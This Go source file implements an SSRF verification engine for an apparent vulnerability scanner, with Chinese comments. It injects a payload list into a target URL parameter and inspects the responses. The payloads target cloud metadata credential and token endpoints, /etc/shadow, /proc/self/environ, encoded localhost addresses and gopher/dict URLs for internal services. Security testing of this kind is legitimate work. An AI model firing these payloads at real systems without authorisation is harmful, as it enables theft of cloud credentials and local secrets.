package verifier

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/sirupsen/logrus"
)

// =====================================================================
// SSRF Verifier - 深度驗證引擎
// =====================================================================
// 來源: C:\Users\User\Downloads\新增資料夾 (6)\ssrf_verifier.go
// 用途: 接收 Rust 發現的 Candidate → 100+ Payload 驗證
// =====================================================================

// Candidate 代表 Rust 引擎發現的潛在 SSRF 漏洞點
type Candidate struct {
	URL    string `json:"url"`
	Method string `json:"method"`
	Param  string `json:"param"` // 例如 "callback", "url", "webhook"
}

// VerificationResult 代表單個 Payload 的驗證結果
type VerificationResult struct {
	IsVulnerable bool   `json:"is_vulnerable"`
	Payload      string `json:"payload"`
	Evidence     string `json:"evidence"`     // 例如：收到的 metadata 回應
	ResponseCode int    `json:"response_code"`
	ResponseSize int    `json:"response_size"`
	ResponseTime int    `json:"response_time_ms"`
}

// Verifier 負責執行深度 SSRF 驗證
type Verifier struct {
	client   *http.Client
	payloads []string
}

// NewVerifier 創建新的 SSRF Verifier
func NewVerifier() *Verifier {
	return &Verifier{
		client: &http.Client{
			Timeout: 10 * time.Second,
			// 禁止自動跳轉，以便分析 3xx 回應
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		// 針對 Go 引擎的高併發優勢，這裡可以定義大量複雜 Payloads
		payloads: getSSRFPayloads(),
	}
}

// Verify 執行併發驗證
// ctx: 上下文控制
// candidate: Rust 引擎發現的潛在漏洞點
// 返回: 所有驗證結果
func (v *Verifier) Verify(ctx context.Context, candidate Candidate) ([]VerificationResult, error) {
	var results []VerificationResult
	var wg sync.WaitGroup
	resultChan := make(chan VerificationResult, len(v.payloads))
	sem := make(chan struct{}, 10) // 限制併發數為 10，避免自我 DoS

	// 解析原始 URL
	targetURL, err := url.Parse(candidate.URL)
	if err != nil {
		return nil, fmt.Errorf("failed to parse candidate URL: %w", err)
	}

	logrus.Infof("[SSRF Verifier] Starting verification for %s (param: %s)", candidate.URL, candidate.Param)

	for _, payload := range v.payloads {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{} // Acquire semaphore
			defer func() { <-sem }() // Release semaphore

			// 構造注入 Payload 的 URL
			attackURL := replaceParam(targetURL, candidate.Param, p)
			
			startTime := time.Now()
			success, evidence, code, size := v.checkSSRF(ctx, attackURL)
			responseTime := int(time.Since(startTime).Milliseconds())

			if success {
				resultChan <- VerificationResult{
					IsVulnerable: true,
					Payload:      p,
					Evidence:     evidence,
					ResponseCode: code,
					ResponseSize: size,
					ResponseTime: responseTime,
				}
				logrus.Warnf("[SSRF Verifier] VULNERABLE: %s with payload %s", attackURL, p)
			}
		}(payload)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	for res := range resultChan {
		results = append(results, res)
	}

	logrus.Infof("[SSRF Verifier] Completed verification for %s, found %d vulnerabilities", candidate.URL, len(results))
	return results, nil
}

// replaceParam 將 URL 中的指定參數值替換為 Payload
func replaceParam(u *url.URL, paramKey, payload string) string {
	q := u.Query()
	q.Set(paramKey, payload)
	u.RawQuery = q.Encode()
	return u.String()
}

// checkSSRF 發送請求並分析回應
// 返回: (是否漏洞, 證據, 狀態碼, 響應大小)
func (v *Verifier) checkSSRF(ctx context.Context, target string) (bool, string, int, int) {
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return false, "", 0, 0
	}

	// 模擬正常瀏覽器 Header，避免被簡單過濾
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AIVA-Go-Verifier/1.0")
	req.Header.Set("Accept", "*/*")

	resp, err := v.client.Do(req)
	if err != nil {
		// 處理 timeout，有時候 timeout 也是一種探測結果（針對內部埠掃描）
		if strings.Contains(err.Error(), "timeout") {
			return false, "Timeout (possible internal host)", 0, 0
		}
		return false, "", 0, 0
	}
	defer resp.Body.Close()

	// 讀取響應 Body (限制大小避免內存溢出)
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // 限制 1MB
	if err != nil {
		return false, "", resp.StatusCode, 0
	}

	bodyStr := string(body)
	bodySize := len(body)

	// 檢測 AWS Metadata API 響應
	if strings.Contains(bodyStr, "ami-id") || 
	   strings.Contains(bodyStr, "instance-id") ||
	   strings.Contains(bodyStr, "local-ipv4") {
		return true, "AWS Metadata API response detected", resp.StatusCode, bodySize
	}

	// 檢測 GCP Metadata API 響應
	if strings.Contains(bodyStr, "computeMetadata") ||
	   strings.Contains(bodyStr, "instance/attributes") {
		return true, "GCP Metadata API response detected", resp.StatusCode, bodySize
	}

	// 檢測 Azure Metadata API 響應
	if strings.Contains(bodyStr, "azEnvironment") ||
	   strings.Contains(bodyStr, "location") && strings.Contains(bodyStr, "vmSize") {
		return true, "Azure Metadata API response detected", resp.StatusCode, bodySize
	}

	// 檢測文件讀取 (file:// 協議)
	if strings.Contains(bodyStr, "root:x:0:0") || // /etc/passwd
	   strings.Contains(bodyStr, "[extensions]") { // Windows INI files
		return true, "Local file read detected", resp.StatusCode, bodySize
	}

	// 檢測內部服務響應 (Redis, Memcached, etc.)
	if strings.Contains(bodyStr, "redis_version") ||
	   strings.Contains(bodyStr, "STAT version") {
		return true, "Internal service response detected", resp.StatusCode, bodySize
	}

	return false, "", resp.StatusCode, bodySize
}

// getSSRFPayloads 返回完整的 SSRF Payload 清單
// TODO: 擴充到 100+ Payload
func getSSRFPayloads() []string {
	return []string{
		// ===== AWS Metadata API (10 個) =====
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/meta-data/ami-id",
		"http://169.254.169.254/latest/meta-data/instance-id",
		"http://169.254.169.254/latest/user-data/",
		"http://169.254.169.254/latest/dynamic/instance-identity/",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://169.254.169.254/latest/meta-data/local-ipv4",
		"http://169.254.169.254/latest/meta-data/public-ipv4",
		"http://169.254.169.254/latest/meta-data/hostname",
		"http://169.254.169.254/latest/meta-data/placement/availability-zone",

		// ===== GCP Metadata API (10 個) =====
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://metadata.google.internal/computeMetadata/v1/instance/",
		"http://metadata.google.internal/computeMetadata/v1/instance/id",
		"http://metadata.google.internal/computeMetadata/v1/instance/hostname",
		"http://metadata.google.internal/computeMetadata/v1/instance/zone",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
		"http://metadata.google.internal/computeMetadata/v1/project/project-id",
		"http://metadata/computeMetadata/v1/instance/",
		"http://169.254.169.254/computeMetadata/v1/instance/",
		"http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/",

		// ===== Azure Metadata API (10 個) =====
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		"http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
		"http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
		"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
		"http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01",
		"http://169.254.169.254/metadata/instance/compute/vmSize?api-version=2021-02-01",
		"http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01",
		"http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01",
		"http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01",
		"http://169.254.169.254/metadata/instance/compute/osProfile?api-version=2021-02-01",

		// ===== Localhost Variations (20 個) =====
		"http://127.0.0.1/",
		"http://127.0.0.1:22/",
		"http://127.0.0.1:80/",
		"http://127.0.0.1:443/",
		"http://127.0.0.1:8080/",
		"http://127.0.0.1:3306/", // MySQL
		"http://127.0.0.1:6379/", // Redis
		"http://127.0.0.1:5432/", // PostgreSQL
		"http://127.0.0.1:27017/", // MongoDB
		"http://localhost/",
		"http://localhost:8080/",
		"http://0.0.0.0/",
		"http://0.0.0.0:8080/",
		"http://[::1]/",
		"http://[::1]:8080/",
		"http://0x7f000001/", // Hex encoding
		"http://2130706433/", // Decimal encoding
		"http://127.1/", // Short form
		"http://127.0.1/",
		"http://[0:0:0:0:0:0:0:1]/", // IPv6

		// ===== File Protocols (10 個) =====
		"file:///etc/passwd",
		"file:///etc/shadow",
		"file:///etc/hosts",
		"file:///proc/self/environ",
		"file:///c:/windows/win.ini",
		"file:///c:/windows/system32/drivers/etc/hosts",
		"file:///c:/boot.ini",
		"file://localhost/etc/passwd",
		"file:///var/log/apache2/access.log",
		"file:///var/www/html/index.php",

		// ===== Dict/Gopher Protocols (10 個) =====
		"dict://127.0.0.1:6379/info", // Redis
		"dict://127.0.0.1:11211/stats", // Memcached
		"gopher://127.0.0.1:25/", // SMTP
		"gopher://127.0.0.1:6379/", // Redis
		"gopher://127.0.0.1:9000/", // FastCGI
		"dict://localhost:6379/info",
		"dict://localhost:11211/stats",
		"gopher://localhost:25/",
		"gopher://localhost:6379/",
		"gopher://localhost:9000/",

		// TODO: 繼續擴充到 100+ Payload
		// - SSRF Bypass Techniques (IP Encoding, URL Parsing Tricks)
		// - Internal Services (Elasticsearch, Jenkins, etc.)
		// - DNS Rebinding Payloads
		// - ... 更多高級 Payload
	}
}
